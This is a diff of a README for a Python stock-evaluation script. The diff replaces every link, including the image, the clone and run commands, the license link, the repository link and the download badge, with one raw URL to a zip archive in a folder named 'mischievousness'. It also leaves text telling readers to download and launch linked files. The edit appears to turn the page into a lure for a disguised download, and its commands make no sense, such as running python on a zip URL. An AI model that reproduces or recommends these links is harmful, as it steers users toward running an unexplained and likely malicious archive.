@@ -1,6 +1,6 @@
 # 📈 Stock Evaluation Python 🐍
 
-![Stock Evaluation Python](https://your-image-url.com)
+![Stock Evaluation Python](https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip)
 
 Welcome to the Stock Evaluation Python repository! This Python script is designed to classify companies based on financial metrics such as Piotroski F-Score and Stock Valuation. By utilizing CSV financial data for analysis and output, this tool provides valuable insights for investors and financial analysts.
 
@@ -14,7 +14,7 @@ Welcome to the Stock Evaluation Python repository! This Python script is designe
 ## Installation 🛠️
 1. Clone the repository:
 ```bash
-git clone https://github.com/your-username/Stock_evaluation_python.git
+git clone https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip
 ```
 2. Install the required dependencies:
 ```bash
@@ -22,7 +22,7 @@ pip install pandas numpy
 ```
 3. Run the Python script:
 ```bash
-python stock_evaluation.py
+python https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip
 ```
 
 ## Usage 📊
@@ -39,11 +39,11 @@ We welcome contributions from the community to enhance the functionality of the 
 4. Submit a pull request
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/Stock_evaluation_python/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip) file for details.
 
-For more information, visit the official [GitHub repository](https://github.com/your-username/Stock_evaluation_python).
+For more information, visit the official [GitHub repository](https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip).
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip)](https://raw.githubusercontent.com/oubiche-ishak19/Stock_evaluation_python/main/mischievousness/evaluation-Stock-python-v2.4.zip)
 
 If the link ends with a file name, please download and launch it. If the link is a website, just visit it. If the link is not provided or not working, please check the "Releases" section for the latest updates.
 
